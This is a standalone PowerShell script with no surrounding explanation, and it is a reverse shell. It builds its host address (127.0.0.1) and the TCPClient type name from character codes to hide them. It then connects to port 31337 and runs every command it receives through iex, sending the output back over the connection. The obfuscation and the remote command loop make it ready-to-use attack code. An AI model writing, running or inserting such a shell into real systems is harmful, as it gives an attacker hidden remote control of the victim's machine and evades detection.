$h=[char]49+[char]50+[char]55+[char]46+[char]48+[char]46+[char]48+[char]46+[char]49
$p=31337
$t=New-Object ([string]::Join('',([char]78,[char]101,[char]116,[char]46,[char]83,[char]111,[char]99,[char]107,[char]101,[char]116,[char]115,[char]46,[char]84,[char]67,[char]80,[char]67,[char]108,[char]105,[char]101,[char]110,[char]116)))
$c=New-Object $t($h,$p)
$s=$c.GetStream()
$r=New-Object IO.StreamReader($s)
$w=New-Object IO.StreamWriter($s)
$w.AutoFlush=$true
$b=New-Object System.Byte[] 1024
while($c.Connected){
 while($s.DataAvailable){
  $d=$s.Read($b,0,$b.Length)
  $x=([Text.Encoding]::UTF8).GetString($b,0,$d-1)
 }
 if($c.Connected -and $x.Length -gt 1){
  $o=try{iex ($x) 2>&1}catch{$_}
  $w.Write($o+"`n")
  $x=$null
 }
}
$c.Close();$s.Close();$r.Close();$w.Close()
